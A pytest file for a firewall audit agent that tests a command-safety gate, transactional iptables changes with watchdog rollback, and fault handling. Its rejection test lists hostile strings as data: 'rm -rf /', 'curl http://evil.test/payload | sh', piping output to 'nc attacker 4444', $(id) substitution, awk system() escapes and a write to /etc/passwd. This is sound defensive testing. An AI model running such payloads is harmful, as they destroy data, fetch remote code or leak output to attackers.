"""Tests for the deterministic command gate and transactional enforcement."""

import json

import pytest

from audit_agent.audit.engine import ComplianceIssue
from audit_agent.devices.linux_iptables import (
    LinuxIptables,
    validate_command_safety,
)
from audit_agent.devices.simulated_iptables import SimulatedLinuxIptables
from audit_agent.enforcement.remediation import (
    RemediationAction,
    RemediationExecutor,
    RemediationPlan,
    RemediationResult,
    RemediationStatus,
    RemediationStrategy,
)


class TestCommandGate:
    @pytest.mark.parametrize(
        "command",
        [
            "iptables-save",
            "iptables -A INPUT -p tcp --dport 22 -j ACCEPT",
            "ip link show | grep '^[0-9]' | awk '{print $2}' | sed 's/:$//'",
            "printf '%s' 'YWJj' | base64 -d | sudo iptables-restore",
            "printf '%s' 'YWJj' | base64 -d | sudo tee /run/auditagent/watchdog.sh",
        ],
    )
    def test_engine_generated_commands_allowed(self, command):
        assert validate_command_safety(command) is None

    @pytest.mark.parametrize(
        "command",
        [
            "iptables -A INPUT -j ACCEPT; rm -rf /",
            "iptables -A INPUT -j ACCEPT && curl evil.sh",
            "true || true",
            "iptables -A INPUT -j ACCEPT `id`",
            "iptables -A INPUT -j ACCEPT $(id)",
            "iptables -A INPUT -j ACCEPT\nrm -rf /",
            "iptables -A INPUT -j ACCEPT > /etc/passwd",
            "curl http://evil.test/payload | sh",
            "iptables -L | nc attacker 4444",
            "rm -rf /",
            "awk 'BEGIN { system(\"id\") }'",
            "iptables -L | awk 'BEGIN { system(\"id\") }'",
            "iptables -L | sed -n '1e id'",
            "iptables -L | grepfoo",
            "iptables -L | sh",
            "iptables --modprobe=/tmp/evil",
            "iptables -A INPUT",
            "iptables -A INPUT -p tcp",
            "id # iptables",
        ],
    )
    def test_injection_rejected(self, command):
        assert validate_command_safety(command) is not None

    @pytest.mark.asyncio
    async def test_execute_command_rejects_instead_of_running(self):
        device = LinuxIptables(host="10.0.0.1", username="root")
        device._ssh_client = object()  # non-None so it would otherwise proceed
        result = await device.execute_command("iptables -A INPUT -j ACCEPT; rm -rf /")
        assert result.success is False
        assert "rejected" in (result.error or "").lower()


def _backup(rules):
    return json.dumps({"rules": rules})


class TestTransactionalApply:
    @pytest.mark.asyncio
    async def test_simulator_transaction_commits_on_success(self, tmp_path):
        device = SimulatedLinuxIptables(
            host="sim", state_file=str(tmp_path / "state.json")
        )
        await device.connect()

        result = await device.apply_transaction(
            ["iptables -A INPUT -p tcp --dport 22 -j ACCEPT"], timeout=1
        )

        assert result.success
        assert "-A INPUT -p tcp --dport 22 -j ACCEPT" in device._load_rules()

    @pytest.mark.asyncio
    async def test_simulator_transaction_rolls_back_on_failure(self, tmp_path):
        device = SimulatedLinuxIptables(
            host="sim",
            state_file=str(tmp_path / "state.json"),
            fail_on_command="--dport 22",
        )
        await device.connect()

        result = await device.apply_transaction(
            ["iptables -A INPUT -p tcp --dport 22 -j ACCEPT"], timeout=1
        )

        assert result.success is False
        assert device._load_rules() == []

    @pytest.mark.asyncio
    async def test_watchdog_script_is_armed_then_committed(self, monkeypatch):
        """A real device must arm the on-host watchdog before applying."""
        device = LinuxIptables(host="10.0.0.1", username="root")
        device._ssh_client = object()
        executed = []
        written = {}

        async def fake_execute(command, use_sudo=None):
            executed.append(command)
            from audit_agent.devices.base import CommandResult

            return CommandResult(
                command=command, success=True, output="", execution_time=0.0
            )

        async def fake_backup():
            return json.dumps(
                {"ipv4": "*filter\nCOMMIT\n", "ipv6": "*filter\nCOMMIT\n"}
            )

        async def fake_write(path, content):
            written[path] = content
            from audit_agent.devices.base import CommandResult

            return CommandResult(
                command="write", success=True, output="", execution_time=0.0
            )

        async def fake_batch(commands, stop_on_error=True):
            from audit_agent.devices.base import CommandResult

            return [
                CommandResult(command=c, success=True, output="", execution_time=0.0)
                for c in commands
            ]

        monkeypatch.setattr(device, "execute_command", fake_execute)
        monkeypatch.setattr(device, "backup_configuration", fake_backup)
        monkeypatch.setattr(device, "_write_remote_file", fake_write)
        monkeypatch.setattr(device, "execute_commands_batch", fake_batch)

        result = await device.apply_transaction(
            ["iptables -A INPUT -p tcp --dport 22 -j ACCEPT"], timeout=30
        )

        assert result.success
        script = next(iter(written.values()))
        assert "sleep 30" in script
        assert "iptables-restore" in script
        assert "auditagent/commit" in script
        # Watchdog armed before apply, commit marker written after.
        assert any("sudo install -d -m 0700" in c for c in executed)
        assert any("sudo sh -c" in c and "kill" in c for c in executed)
        assert any("sudo setsid" in c for c in executed)
        assert any("touch" in c and "commit" in c for c in executed)
        assert all("/tmp/auditagent" not in c for c in executed)

    @pytest.mark.asyncio
    @pytest.mark.parametrize("failed_fragment", ["sudo setsid", "sudo touch"])
    async def test_watchdog_control_failure_fails_transaction(
        self, monkeypatch, failed_fragment
    ):
        device = LinuxIptables(host="10.0.0.1", username="root")
        device._ssh_client = object()
        batch_called = False

        async def fake_execute(command, use_sudo=None):
            from audit_agent.devices.base import CommandResult

            success = failed_fragment not in command
            return CommandResult(
                command=command,
                success=success,
                output="",
                error=None if success else "injected failure",
                execution_time=0.0,
            )

        async def fake_backup():
            return json.dumps(
                {"ipv4": "*filter\nCOMMIT\n", "ipv6": "*filter\nCOMMIT\n"}
            )

        async def fake_write(path, content):
            from audit_agent.devices.base import CommandResult

            return CommandResult(
                command="write", success=True, output="", execution_time=0.0
            )

        async def fake_batch(commands, stop_on_error=True):
            nonlocal batch_called
            from audit_agent.devices.base import CommandResult

            batch_called = True
            return [
                CommandResult(
                    command=command, success=True, output="", execution_time=0.0
                )
                for command in commands
            ]

        monkeypatch.setattr(device, "execute_command", fake_execute)
        monkeypatch.setattr(device, "backup_configuration", fake_backup)
        monkeypatch.setattr(device, "_write_remote_file", fake_write)
        monkeypatch.setattr(device, "execute_commands_batch", fake_batch)

        result = await device.apply_transaction(
            ["iptables -A INPUT -j ACCEPT"], timeout=30
        )

        assert result.success is False
        assert batch_called is (failed_fragment == "sudo touch")
        assert result.rollback_attempted is (failed_fragment == "sudo touch")

    @pytest.mark.asyncio
    @pytest.mark.parametrize(
        ("restore_success", "touch_success", "rollback_performed"),
        [(False, True, False), (True, False, False), (True, True, True)],
    )
    async def test_watchdog_not_committed_when_apply_fails(
        self,
        monkeypatch,
        restore_success,
        touch_success,
        rollback_performed,
    ):
        device = LinuxIptables(host="10.0.0.1", username="root")
        device._ssh_client = object()
        executed = []

        async def fake_execute(command, use_sudo=None):
            executed.append(command)
            from audit_agent.devices.base import CommandResult

            success = touch_success or "sudo touch" not in command
            return CommandResult(
                command=command,
                success=success,
                output="",
                error=None if success else "touch failed",
                execution_time=0.0,
            )

        async def fake_backup():
            return json.dumps(
                {"ipv4": "*filter\nCOMMIT\n", "ipv6": "*filter\nCOMMIT\n"}
            )

        async def fake_write(path, content):
            from audit_agent.devices.base import CommandResult

            return CommandResult(
                command="write", success=True, output="", execution_time=0.0
            )

        async def fake_batch(commands, stop_on_error=True):
            from audit_agent.devices.base import CommandResult

            return [
                CommandResult(
                    command=c,
                    success=False,
                    output="",
                    error="iptables: Invalid",
                    execution_time=0.0,
                )
                for c in commands
            ]

        async def fake_restore(backup):
            from audit_agent.devices.base import CommandResult

            return CommandResult(
                command="restore",
                success=restore_success,
                output="restored" if restore_success else "",
                error=None if restore_success else "restore failed",
                execution_time=0.0,
            )

        monkeypatch.setattr(device, "execute_command", fake_execute)
        monkeypatch.setattr(device, "backup_configuration", fake_backup)
        monkeypatch.setattr(device, "_write_remote_file", fake_write)
        monkeypatch.setattr(device, "execute_commands_batch", fake_batch)
        monkeypatch.setattr(device, "restore_configuration", fake_restore)

        result = await device.apply_transaction(
            ["iptables -A INPUT -j ACCEPT"], timeout=30
        )

        assert result.success is False
        assert result.rollback_attempted is True
        assert result.rollback_performed is rollback_performed
        touched = any(
            "touch" in command and "commit" in command for command in executed
        )
        assert touched is restore_success


class TestFaultInjection:
    """Fault-injection scenarios: invalid command, locked table, lost session."""

    @pytest.mark.asyncio
    async def test_invalid_command_fails_cleanly(self, tmp_path):
        device = SimulatedLinuxIptables(
            host="sim",
            state_file=str(tmp_path / "s.json"),
            fail_on_command="--dport 9999",
        )
        await device.connect()
        results = await device.apply_commands(
            ["iptables -A INPUT -p tcp --dport 9999 -j ACCEPT"]
        )
        assert all(not r.success for r in results)
        assert device._load_rules() == []

    @pytest.mark.asyncio
    async def test_batch_stops_at_first_failure(self, tmp_path):
        device = SimulatedLinuxIptables(
            host="sim", state_file=str(tmp_path / "s.json"), fail_on_command="--dport 5"
        )
        await device.connect()
        results = await device.apply_commands(
            [
                "iptables -A INPUT -p tcp --dport 5 -j ACCEPT",
                "iptables -A INPUT -p tcp --dport 6 -j ACCEPT",
            ]
        )
        assert len(results) == 1
        assert results[0].success is False

    @pytest.mark.asyncio
    async def test_not_connected_fails_closed(self):
        device = LinuxIptables(host="10.0.0.1", username="root")
        results = await device.apply_commands(["iptables -A INPUT -j DROP"])
        assert len(results) == 1
        assert results[0].success is False
        assert "not connected" in (results[0].error or "").lower()


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("rollback_performed", "expected_count"), [(True, 1), (False, 0)]
)
async def test_transactional_rollback_is_not_repeated(
    tmp_path, monkeypatch, rollback_performed, expected_count
):
    device = SimulatedLinuxIptables(host="sim", state_file=str(tmp_path / "state.json"))
    issue = ComplianceIssue(
        severity="high",
        rule_id="r1",
        rule_name="rule",
        issue_type="missing_rule",
        description="missing",
        device="sim",
        recommendation="add",
    )
    action = RemediationAction(
        id="a1",
        issue=issue,
        device=device,
        action_type="add_rule",
        commands=["iptables -A INPUT -j ACCEPT"],
        rollback_commands=["iptables -D INPUT -j ACCEPT"],
        risk_level="high",
        estimated_duration=1,
        validation_commands=[],
        description="add rule",
    )
    plan = RemediationPlan(
        policy_name="test",
        device_count=1,
        total_actions=1,
        strategy=RemediationStrategy.BALANCED,
        actions=[action],
        execution_order=[action.id],
        estimated_total_time=1,
        risk_assessment="test",
        created_timestamp="now",
    )
    executor = RemediationExecutor(watchdog_timeout=30)
    rollback_called = False

    async def fake_execute(_action, _dry_run):
        return RemediationResult(
            action_id=action.id,
            success=False,
            status=RemediationStatus.FAILED,
            command_results=[],
            validation_passed=False,
            execution_time=0,
            rollback_performed=rollback_performed,
            rollback_attempted=True,
        )

    async def fake_rollback(_action):
        nonlocal rollback_called
        rollback_called = True
        return True

    monkeypatch.setattr(executor, "_execute_single_action", fake_execute)
    monkeypatch.setattr(executor, "_perform_rollback", fake_rollback)

    result = await executor.execute_remediation_plan(plan, dry_run=False)

    assert result.actions_rolled_back == expected_count
    assert rollback_called is False
